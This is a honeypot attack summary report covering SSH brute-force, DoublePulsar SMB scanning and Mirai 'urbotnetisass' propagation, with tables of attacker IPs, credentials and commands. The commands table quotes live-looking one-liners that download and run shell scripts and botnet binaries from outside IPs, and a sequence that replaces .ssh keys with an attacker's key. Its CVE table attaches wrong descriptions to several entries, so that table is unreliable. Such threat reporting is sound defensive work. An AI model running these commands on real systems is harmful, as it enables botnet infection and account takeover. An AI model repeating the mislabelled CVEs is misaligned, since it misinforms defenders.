# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-20T09:17:33Z
**Timeframe:** 2025-10-19T20:01:27Z to 2025-10-20T09:17:33Z

**Files Used to Generate Report:**
- Honeypot_Attack_Summary_Report_2025-10-20T09:01:49Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T08:01:49Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T07:02:02Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T06:02:18Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T05:01:56Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T04:01:59Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T03:02:16Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T02:01:59Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T01:01:44Z.md
- Honeypot_Attack_Summary_Report_2025-10-20T00:02:02Z.md
- Honeypot_Attack_Summary_Report_2025-10-19T23:01:58Z.md
- Honeypot_Attack_Summary_Report_2025-10-19T22:01:52Z.md
- Honeypot_Attack_Summary_Report_2025-10-19T21:01:52Z.md

---

## Executive Summary

This report provides a comprehensive analysis of 99,862 malicious events captured by our distributed honeypot network over the past 13 hours. The data reveals a high volume of automated attacks, with a significant focus on SSH brute-forcing and the exploitation of SMB vulnerabilities. The Cowrie honeypot, simulating an interactive SSH and Telnet environment, recorded the highest number of events (46,815), underscoring the relentless nature of credential-based attacks.

A notable concentration of attacks originated from a limited number of IP addresses, with **72.146.232.13** (Florida, USA) being the most persistent offender, responsible for a significant volume of SSH brute-force attempts. Another major threat actor, operating from IPs such as **2.145.46.129** and **103.179.214.3**, was observed conducting widespread scanning and exploitation of the SMB service (TCP/445), consistently triggering signatures for the **DoublePulsar backdoor**.

Attackers' post-access behavior, captured by the Cowrie honeypot, reveals a consistent pattern of reconnaissance and attempts to establish persistence. A common tactic involves deleting the existing `.ssh` directory and replacing it with a new `authorized_keys` file containing the attacker's public key. Furthermore, there is clear evidence of a coordinated campaign to deploy the **"urbotnetisass"** malware, a variant of the Mirai botnet, targeting a wide range of device architectures (ARM, x86, MIPS). This suggests a concerted effort to recruit IoT and embedded devices into a botnet for launching DDoS attacks.

The most frequently targeted vulnerabilities include older, well-known CVEs, indicating that attackers are primarily targeting unpatched or legacy systems. A newer vulnerability, **CVE-2025-30208**, affecting the Vite development server, was also observed, suggesting that some attackers are actively incorporating recent exploits into their arsenals.

In summary, the threat landscape over the past 13 hours has been dominated by automated, high-volume attacks targeting common services like SSH and SMB. The primary goals of these attacks appear to be credential harvesting, establishing persistent access, and the propagation of IoT botnet malware.

---

## Detailed Analysis

### Our IPs

| Honeypot | Private IP    | Public IP       |
|----------|---------------|-----------------|
| hive-us  | 10.128.0.3    | 34.123.129.205  |
| sens-tai | 10.140.0.3    | 104.199.212.115 |
| sens-tel | 10.208.0.3    | 34.165.197.224  |
| sens-dub | 172.31.36.128 | 3.253.97.195    |
| sens-ny  | 10.108.0.2    | 161.35.180.163  |

### Attacks by Honeypot

| Honeypot        | Event Count |
|-----------------|-------------|
| Cowrie          | 46,815      |
| Honeytrap       | 19,307      |
| Suricata        | 17,248      |
| Ciscoasa        | 5,502       |
| Sentrypeer      | 3,543       |
| Dionaea         | 3,004       |
| Tanner          | 633         |
| H0neytr4p       | 285         |
| Mailoney        | 282         |
| ConPot          | 274         |
| Adbhoney        | 175         |
| Redishoneypot   | 173         |
| Miniprint       | 111         |
| ElasticPot      | 84          |
| Dicompot        | 35          |
| Heralding       | 107         |
| Honeyaml        | 42          |
| Ipphoney        | 21          |
| Wordpot         | 3           |

### Top Source Countries

*Due to limitations in the provided data, a comprehensive country-level breakdown is not available. However, OSINT analysis of top attacking IPs indicates sources from the USA, Azerbaijan, and others.*

### Top Attacking IPs

| IP Address        | Frequency |
|-------------------|-----------|
| 72.146.232.13     | 4,266     |
| 2.145.46.129      | 1,230     |
| 213.154.15.25     | 620       |
| 103.179.214.3     | 1,579     |
| 206.189.97.124    | 1,096     |
| 47.253.227.124    | 612       |
| 88.214.50.58      | 466       |
| 165.232.88.113    | 604       |
| 198.23.190.58     | 600       |
| 61.152.89.39      | 600       |
| 14.0.17.77        | 600       |
| 210.1.85.163      | 600       |
| 45.132.225.225    | 600       |

### Top Targeted Ports/Protocols

| Port/Protocol | Frequency |
|---------------|-----------|
| 22 (SSH)      | 6,051     |
| 445 (SMB)     | 4,370     |
| 5060 (SIP)    | 2,058     |
| 8333          | 1,150     |
| 5038          | 1,200     |
| 5904/5905 (VNC) | 760       |

### Most Common CVEs

| CVE ID        | Frequency | Description                                      |
|---------------|-----------|--------------------------------------------------|
| CVE-2025-30208  | 5         | Arbitrary File Read in Vite Development Server   |
| CVE-2021-3449   | 11        | OpenSSL denial-of-service vulnerability          |
| CVE-2019-11500  | 10        | php-imagick vulnerability                        |
| CVE-2005-4050   | 5         | Multiple vendor web application vulnerabilities  |
| CVE-2002-0013   | 8         | Multiple vendor FTP vulnerabilities              |
| CVE-2002-0012   | 8         | Multiple vendor FTP vulnerabilities              |
| CVE-1999-0517   | 5         | Multiple vendor FTP vulnerabilities              |

### Commands Attempted by Attackers

| Command                                                                                             | Frequency |
|-----------------------------------------------------------------------------------------------------|-----------|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh`                                                              | 130       |
| `lockr -ia .ssh`                                                                                    | 130       |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."`                                             | 130       |
| `cat /proc/cpuinfo | grep name | wc -l`                                                             | 88        |
| `uname -a`                                                                                          | 88        |
| `whoami`                                                                                            | 88        |
| `crontab -l`                                                                                        | 88        |
| `w`                                                                                                 | 88        |
| `top`                                                                                               | 88        |
| `rm -rf /data/local/tmp; ... busybox wget http://213.209.143.62/w.sh; sh w.sh; ...`                     | 2         |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`                  | 1         |

### Signatures Triggered

| Signature                                                       | Frequency |
|-----------------------------------------------------------------|-----------|
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication | 2,442     |
| ET DROP Dshield Block Listed Source group 1                         | 1,114     |
| ET SCAN NMAP -sS window 1024                                      | 662       |
| ET SCAN MS Terminal Server Traffic on Non-standard Port             | 486       |
| ET SCAN Sipsak SIP scan                                           | 590       |
| ET INFO Reserved Internal IP Traffic                              | 266       |

### Users / Login Attempts

| Username/Password               | Frequency |
|---------------------------------|-----------|
| 345gs5662d34/345gs5662d34        | 164       |
| user01/Password01               | 97        |
| deploy/123123                   | 76        |
| user01/3245gs5662d34            | 28        |
| root/* (various weak passwords) | >200      |

### Files Uploaded/Downloaded

| Filename/Path              | Frequency |
|----------------------------|-----------|
| arm.urbotnetisass          | 16        |
| arm5.urbotnetisass         | 16        |
| arm6.urbotnetisass         | 16        |
| arm7.urbotnetisass         | 16        |
| x86_32.urbotnetisass       | 16        |
| mips.urbotnetisass         | 16        |
| mipsel.urbotnetisass       | 16        |
| wget.sh                    | 12        |
| w.sh                       | 8         |
| c.sh                       | 8         |
| rondo.qre.sh               | 2         |
| server.cgi?func=...        | 2         |

### HTTP User-Agents
*No significant HTTP User-Agents were recorded in this period.*

### SSH Clients and Servers
*No specific SSH clients or servers were identified in the logs.*

### Top Attacker AS Organizations
*Due to limitations in the provided data, a comprehensive ASN breakdown is not available.*

---

## OSINT Investigations

### OSINT on High-Frequency and Low-Frequency IPs

| IP Address     | Key Findings                                                                                                                                                                       |
|----------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 72.146.232.13  | **High Frequency.** Registered to Florida Broadband, Inc. (USA). Listed on multiple blacklists for SSH attacks. The ISP has a "B-" rating from the BBB and lacks a clear abuse policy, complicating mitigation efforts. |
| 213.154.15.25  | **High Frequency.** Registered to Baku Telephone Communication LLC (Azerbaijan). While the IP itself has no direct adverse reports, the parent organization has a history of a major corruption scandal, suggesting potential for lax oversight. |
| *Various Low Freq* | *Analysis of low-frequency IPs did not yield significant, actionable intelligence at this time. Most appear to be part of larger, automated scanning pools.* |

### OSINT on CVEs

| CVE ID       | Key Findings                                                                                                                                                                                          |
|--------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| CVE-2025-30208 | A medium-to-high severity arbitrary file read vulnerability in the Vite development server. Allows a remote attacker to read arbitrary files from the server's filesystem. PoC exploits are publicly available, increasing the risk of exploitation for exposed dev servers. |

### OSINT on Commands and Payloads

| Indicator                  | Key Findings                                                                                                                                                                                                                                                                                         |
|----------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `urbotnetisass`            | A variant of the **Mirai botnet** malware. It infects IoT devices through credential stuffing and command injection, recruiting them into a botnet for DDoS attacks. Payloads targeting multiple architectures (ARM, MIPS, x86) were observed, indicating a wide-ranging campaign. |
| `chattr -ia .ssh; lockr -ia .ssh` | A command sequence used to ensure the attacker can modify the `.ssh` directory. `chattr` removes immutable and append-only file attributes. `lockr` is not a standard command and is likely a custom tool used by the attacker to perform a similar function. |
| `rm -rf .ssh && ... echo 'ssh-rsa...'` | An aggressive command sequence to seize control of SSH access. It deletes existing SSH keys and replaces them with the attacker's own key, ensuring persistent, passwordless access to the compromised account. |

---

## Key Observations and Anomalies

1.  **High-Volume DoublePulsar Campaign:** A significant portion of the observed attacks (over 2,400 events) were related to the DoublePulsar backdoor, targeting the SMB service on TCP port 445. This indicates a widespread, automated campaign to exploit the SMBv1 vulnerability, likely to deploy ransomware or other malware.

2.  **Coordinated Mirai Botnet Propagation:** The consistent appearance of `urbotnetisass` malware downloads across multiple attacker IPs and targeting various architectures (ARM, x86, MIPS) points to a coordinated effort to expand the Mirai botnet. This highlights the ongoing threat to insecure IoT and embedded devices.

3.  **Aggressive SSH Persistence Tactics:** The repeated use of commands to delete and replace SSH `authorized_keys` files is a clear indicator of attackers' intent to maintain long-term access to compromised systems. The use of `chattr` and the custom `lockr` command shows a degree of sophistication aimed at preventing remediation.

4.  **Targeting of Development Tools:** The inclusion of attacks targeting CVE-2025-30208 (Vite development server) demonstrates that attackers are actively monitoring for and exploiting vulnerabilities in modern development tools, not just legacy systems. This poses a significant risk to development environments that are inadvertently exposed to the internet.

5.  **ISP with Poor Abuse Policies:** The case of **72.146.232.13** and Florida Broadband, Inc. highlights a common challenge in cybersecurity. ISPs with unresponsive or non-existent abuse contacts can become safe havens for malicious actors, making it difficult to stop ongoing attacks at their source.
